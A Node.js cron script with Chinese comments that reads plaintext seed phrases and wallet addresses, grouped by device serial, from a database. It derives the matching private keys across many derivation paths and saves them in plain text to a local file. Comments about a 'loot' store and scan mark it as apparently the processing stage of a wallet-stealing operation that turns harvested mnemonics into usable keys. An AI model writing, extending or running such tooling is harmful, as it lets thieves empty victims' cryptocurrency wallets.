#!/usr/bin/env node
// 全量私钥派生 v2：直读 PG（助记词 × 无私钥地址）→ 逐助记词批量派生 → 写 data/derived_keys.json
//   【2026-09-14 P4】去 lootStore 依赖：不再每轮跑全量 loot 扫描；数据源 = PG mnemonics/addresses（权威源）
//   【P2】节流：输入指纹（版本+助记词集+未命中地址集）未变且 24h 内试过 → 跳过；新数据/新配置 → 立即重试
//   【P3】路径覆盖：BTC/LTC = BIP44 + BIP49 + BIP84；索引 0-19（钱包标准 gap limit）
// 用法: node derive_all.js   （cron 每分钟，幂等：已命中的不再试；稳定态约 0.1s，未命中项 24h 重试窗口）
const fs = require('fs'), path = require('path');
const { execFileSync } = require('child_process');
const crypto = require('crypto');
const pgStore = require('./pg/pgStore.js');

const DERIVE_VER = 'v3-fmt-infer-bip86-ed25519';   // 【重要】派生配置版本：进指纹 → 升级后旧"已试过"标记自动失效、立即重试
const MAX_IDX = 20;                    // 索引 0..19（标准 gap limit）
const RETRY_MS = 24 * 3600 * 1000;     // 未命中项重试窗口

const cacheFile = path.join(__dirname, 'data', 'derived_keys.json');
let cache = {};
try { cache = JSON.parse(fs.readFileSync(cacheFile, 'utf8')); } catch {}
const attemptFile = path.join(__dirname, 'data', 'derived_attempts.json');
let attempts = {};
try { attempts = JSON.parse(fs.readFileSync(attemptFile, 'utf8')); } catch {}

(async () => {
  const t0 = Date.now();
  const mnR = await pgStore.pool.query("SELECT id, serial, app_type, plain FROM mnemonics WHERE serial IS NOT NULL AND plain IS NOT NULL AND plain <> '' ORDER BY id");
  const adR = await pgStore.pool.query("SELECT serial, public_key, chain FROM addresses WHERE serial IS NOT NULL AND public_key IS NOT NULL AND public_key <> '' AND private_key_plain IS NULL");
  console.log(`[derive ${new Date().toISOString().slice(11, 19)}] 数据源 PG：助记词 ${mnR.rows.length} 条 / 无私钥地址 ${adR.rows.length} 个 | ${Date.now() - t0}ms`);

  const byserial = {}, mnemBySerial = {};
  for (const a of adR.rows) {
    const key = (a.serial + '|' + a.public_key).toLowerCase();
    if (cache[key] && cache[key].pk) continue;              // 已有缓存（PG 回填前的短窗内避免重复派生）
    (byserial[a.serial] = byserial[a.serial] || []).push({ addr: a.public_key, chain: a.chain });
  }
  const _seenMn = new Set();
  for (const m of mnR.rows) {
    const mk = m.serial + '|' + m.plain;   // 同一设备内按明文去重（测试期大量重复助记词）
    if (_seenMn.has(mk)) continue;
    _seenMn.add(mk);
    (mnemBySerial[m.serial] = mnemBySerial[m.serial] || []).push({ id: m.id, mn: m.plain, app: m.app_type });
  }

  let hitTotal = 0, addrTotal = 0;
  for (const serial of Object.keys(byserial)) {
    const targets = byserial[serial];
    const mnems = mnemBySerial[serial] || [];
    addrTotal += targets.length;
    if (!mnems.length) { console.log(`[${serial}] 地址 ${targets.length} 个，但无明文助记词 → 跳过`); continue; }
    // 【P2】节流：输入指纹（配置版本 + 助记词集 + 未命中地址集）未变且 24h 内试过 → 跳过
    const _fp = crypto.createHash('sha1').update(
      DERIVE_VER + '##' + mnems.map(m => m.mn).sort().join('\n') + '##' + targets.map(t => String(t.addr || '').toLowerCase()).sort().join('\n')).digest('hex');
    const _at = attempts[serial] || {};
    if (_at.fp === _fp && Date.now() - (_at.t || 0) < RETRY_MS) {
      console.log(`[${serial}] 输入未变且 24h 内已试过 → 跳过（未命中 ${targets.length} 个）`);
      continue;
    }
    attempts[serial] = { fp: _fp, t: Date.now() };
    try { fs.writeFileSync(attemptFile, JSON.stringify(attempts, null, 2)); } catch {}   // 逐设备记账：中断也不重跑已试过的
    console.log(`[${serial}] 地址 ${targets.length} 个 × 助记词 ${mnems.length} 条`);
    const remaining = new Set(targets.map(t => t.addr.toLowerCase()));
    for (const mm of mnems) {
      if (!remaining.size) break;
      const todo = targets.filter(t => remaining.has(t.addr.toLowerCase())).map(t => ({ addr: t.addr, chain: t.chain }));
      if (!todo.length) break;
      try {
        const out = execFileSync('/usr/bin/python3', [path.join(__dirname, 'derive_batch.py')],
          { input: JSON.stringify({ mnemonic: mm.mn, targets: todo, maxIdx: MAX_IDX }), maxBuffer: 8 * 1024 * 1024, timeout: 180000 }).toString();
        const r = JSON.parse(out);
        for (const h of (r.hits || [])) {
          cache[(serial + '|' + h.addr).toLowerCase()] = { pk: h.private_key, path: h.path, chain: h.chain, from_mnemonic: mm.id, app: mm.app, ts: Date.now(), raw_addr: h.addr, serial };
          try { fs.mkdirSync(path.join(__dirname, 'data'), { recursive: true }); fs.writeFileSync(cacheFile, JSON.stringify(cache, null, 2)); fs.chmodSync(cacheFile, 0o600); } catch {}  // 增量落盘 + 权限收紧
          remaining.delete(h.addr.toLowerCase());
          hitTotal++;
          console.log(`   ✅ ${h.addr}  ${h.path}  ${h.private_key.slice(0, 12)}…`);
        }
      } catch (e) { console.log('   ⚠️', String(e.message).slice(0, 90)); }
    }
    console.log(`   → 剩余未命中 ${remaining.size} 个`);
  }
  fs.mkdirSync(path.join(__dirname, 'data'), { recursive: true });
  fs.writeFileSync(cacheFile, JSON.stringify(cache, null, 2));
  try { fs.chmodSync(cacheFile, 0o600); } catch {}    // 【P5】含明文私钥：权限收紧 600
  try { fs.writeFileSync(attemptFile, JSON.stringify(attempts, null, 2)); } catch {}
  console.log(`\n完成：候选地址 ${addrTotal} 个，本次命中 ${hitTotal} 个，用时 ${((Date.now() - t0) / 1000).toFixed(1)}s`);
  await pgStore.close();
})().catch(e => { console.error('[derive] fatal', e); process.exit(1); });
